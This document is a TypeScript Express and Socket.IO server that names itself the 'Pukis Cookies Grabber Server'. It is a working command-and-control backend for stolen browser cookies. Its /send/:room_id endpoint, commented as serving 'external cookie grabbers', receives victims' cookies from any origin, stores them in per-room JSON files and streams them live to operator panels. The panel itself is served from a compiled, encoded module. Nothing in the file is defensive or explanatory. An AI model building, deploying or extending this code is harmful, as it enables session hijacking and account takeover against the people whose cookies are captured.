import fs from "fs";
import path from "path";
import http from "http";

import dotenv from "dotenv";

import express from "express";
import cors from "cors";
import helmet from "helmet";
import morgan from "morgan";

import { Server } from "socket.io";

// compiled
import { getDecodedFile as getDecodedFilePanel } from "./panel_compiled";

// Load environment variables
dotenv.config();

// Create Express app
const app = express();

// Middleware
app.use(cors());
app.use(
  helmet({
    contentSecurityPolicy: false, // Disable CSP for Socket.IO
  })
);
app.use(morgan("combined"));
app.use(express.json());

// Serve static files from panel directory
app.use(express.static(path.join(__dirname, "panel")));

// Socket.io server
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

// Room management utilities
const ROOMS_DIR = path.join(__dirname, "room");

// Ensure rooms directory exists
if (!fs.existsSync(ROOMS_DIR)) {
  fs.mkdirSync(ROOMS_DIR, { recursive: true });
}

interface CookieEntry {
  id: string;
  hostname: string;
  timestamp: string;
  cookies: any;
  raw_cookies: string;
}

interface RoomData {
  room_id: string;
  created_at: string;
  last_activity: string;
  cookies: CookieEntry[];
}

// Get room file path
function getRoomFilePath(roomId: string): string {
  return path.join(ROOMS_DIR, `${roomId}.json`);
}

// Load room data
function loadRoomData(roomId: string): RoomData {
  const filePath = getRoomFilePath(roomId);

  if (fs.existsSync(filePath)) {
    try {
      const data = fs.readFileSync(filePath, "utf8");
      return JSON.parse(data);
    } catch (error) {
      console.error(`Error loading room data for ${roomId}:`, error);
    }
  }

  // Create new room data if file doesn't exist
  const newRoomData: RoomData = {
    room_id: roomId,
    created_at: new Date().toISOString(),
    last_activity: new Date().toISOString(),
    cookies: [],
  };

  saveRoomData(roomId, newRoomData);
  return newRoomData;
}

// Save room data
function saveRoomData(roomId: string, data: RoomData): void {
  const filePath = getRoomFilePath(roomId);
  data.last_activity = new Date().toISOString();

  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error(`Error saving room data for ${roomId}:`, error);
  }
}

// Add cookie to room
function addCookieToRoom(roomId: string, cookieData: any): void {
  const roomData = loadRoomData(roomId);

  const cookieEntry: CookieEntry = {
    id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
    hostname: cookieData.hostname || "Unknown",
    timestamp: new Date().toISOString(),
    cookies: cookieData.cookies || cookieData,
    raw_cookies: cookieData.raw_cookies || JSON.stringify(cookieData),
  };

  roomData.cookies.unshift(cookieEntry); // Add to beginning

  // Keep only last 1000 cookies to prevent file from growing too large
  if (roomData.cookies.length > 1000) {
    roomData.cookies = roomData.cookies.slice(0, 1000);
  }

  saveRoomData(roomId, roomData);
}

// Clear room cookies
function clearRoomCookies(roomId: string): void {
  const roomData = loadRoomData(roomId);
  roomData.cookies = [];
  saveRoomData(roomId, roomData);
}

// Socket.io connection handling
io.on("connection", (socket) => {
  console.log(`Client connected: ${socket.id}`);

  // Handle room joining
  socket.on("join_room", (data) => {
    const { room_id } = data;

    if (!room_id || typeof room_id !== "string") {
      socket.emit("room_error", { message: "Invalid room ID" });
      return;
    }

    try {
      // Join the socket room
      socket.join(room_id);

      // Load existing room data
      const roomData = loadRoomData(room_id);

      console.log(`Client ${socket.id} joined room: ${room_id}`);

      // Send confirmation with existing cookies
      socket.emit("room_joined", {
        room_id: room_id,
        existing_cookies: roomData.cookies,
      });
    } catch (error) {
      console.error(`Error joining room ${room_id}:`, error);
      socket.emit("room_error", { message: "Failed to join room" });
    }
  });

  // Handle clearing room cookies
  socket.on("clear_room_cookies", (data) => {
    const { room_id } = data;

    if (!room_id) {
      return;
    }

    try {
      clearRoomCookies(room_id);

      // Notify all clients in the room
      io.to(room_id).emit("cookies_cleared");

      console.log(`Cookies cleared for room: ${room_id}`);
    } catch (error) {
      console.error(`Error clearing cookies for room ${room_id}:`, error);
    }
  });

  socket.on("disconnect", () => {
    console.log(`Client disconnected: ${socket.id}`);
  });
});

// API Routes

// Send cookies to room (for external cookie grabbers)
app.post("/send/:room_id", (req, res) => {
  const { room_id } = req.params;
  const cookieData = req.body;

  try {
    // Add cookie to room file
    addCookieToRoom(room_id, cookieData);

    // Emit to all clients in the room
    io.to(room_id).emit("message", cookieData);

    console.log(`Cookies sent to room ${room_id}:`, cookieData);

    res.json({
      success: true,
      message: "Cookies sent successfully",
      room_id: room_id,
    });
  } catch (error) {
    console.error(`Error sending cookies to room ${room_id}:`, error);
    res.status(500).json({
      success: false,
      message: "Failed to send cookies",
    });
  }
});

// Get room data (for debugging/monitoring)
app.get("/room/:room_id", (req, res) => {
  const { room_id } = req.params;

  try {
    const roomData = loadRoomData(room_id);
    res.json(roomData);
  } catch (error) {
    console.error(`Error getting room data for ${room_id}:`, error);
    res.status(500).json({
      success: false,
      message: "Failed to get room data",
    });
  }
});

// List all rooms
app.get("/rooms", (req, res) => {
  try {
    const files = fs.readdirSync(ROOMS_DIR);
    const rooms = files
      .filter((file) => file.endsWith(".json"))
      .map((file) => {
        const roomId = file.replace(".json", "");
        const roomData = loadRoomData(roomId);
        return {
          room_id: roomId,
          created_at: roomData.created_at,
          last_activity: roomData.last_activity,
          cookie_count: roomData.cookies.length,
        };
      });

    res.json({ rooms });
  } catch (error) {
    console.error("Error listing rooms:", error);
    res.status(500).json({
      success: false,
      message: "Failed to list rooms",
    });
  }
});

// Serve the main panel page
app.use((req, res) => {
  let endpoint = req.path;
  if (endpoint === "/") {
    endpoint = "/index.html";
  }
  const file = getDecodedFilePanel(endpoint);
  if (!file) {
    return res.status(404).send("File not found");
  }
  res.set("Content-Type", file.type);
  res.send(file.content);
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Pukis Cookies Grabber Server running on port ${PORT}`);
  console.log(`📁 Rooms directory: ${ROOMS_DIR}`);
  console.log(`🌐 Panel available at: http://localhost:${PORT}`);
});
